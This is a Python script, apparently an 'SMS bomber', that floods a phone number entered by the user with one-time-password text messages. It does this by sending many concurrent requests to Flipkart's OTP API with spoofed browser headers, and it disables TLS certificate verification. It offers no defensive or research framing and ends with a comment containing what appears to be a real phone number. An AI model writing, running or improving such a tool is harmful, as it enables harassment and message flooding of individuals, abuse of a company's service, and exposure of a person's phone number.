import asyncio
import aiohttp
import ssl
from rich.console import Console

console = Console(style='magenta')


class FlipkartSmsBomber:
    def __init__(self) -> None:
        self.successful_sent_count = 0
        self.failure_sent_count = 0
        self.failure_request_status: set[int] = set()

    async def _send_messages(self, session: aiohttp.ClientSession, phone_number: int) -> None:
        url = "https://1.rome.api.flipkart.com/api/7/user/otp/generate"
        
        payload = {"loginId": f"+91{phone_number}"}

        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "Host": "1.rome.api.flipkart.com",
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/",
            "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Sec-Gpc": "1",
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            ),
            "X-User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 "
                "FKUA/website/42/website/Desktop"
            )
        }

        try:
            async with session.post(url, json=payload, headers=headers) as response:
                if response.status == 400:
                    self.successful_sent_count += 1
                else:
                    self.failure_sent_count += 1
                    self.failure_request_status.add(response.status)
        except Exception as e:
            self.failure_sent_count += 1
            console.print(f"❌ Exception occurred: {e}", style="red")

    async def spam_messages(self) -> None:
        try:
            phone_number = int(console.input('➡  Enter Phone Number:- '))
            sms_count = int(console.input('➡  Enter SMS Count:- '))
        except ValueError:
            console.print('❌ Please provide a valid integer.', style='red')
            return

        if sms_count < 0:
            console.print('❌ SMS count cannot be negative.', style='red')
            return

        if not phone_number or not sms_count:
            console.print('❌ Invalid parameters provided.', style='red')
            return

        # Create an SSL context that skips certificate verification
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            tasks = [self._send_messages(session, phone_number) for _ in range(sms_count)]
            await asyncio.gather(*tasks)

            console.print(f'✅ Successfully Sent {self.successful_sent_count} Messages.', style='green')
            if self.failure_sent_count > 0:
                console.print(f'❌ Failed to Send {self.failure_sent_count} Messages.', style='red')
            if self.failure_request_status:
                console.print(f'🔍 Failed With Status Codes: {self.failure_request_status}', style='yellow')


async def main():
    bomber = FlipkartSmsBomber()
    await bomber.spam_messages()


if __name__ == "__main__":
    asyncio.run(main())
#7219065784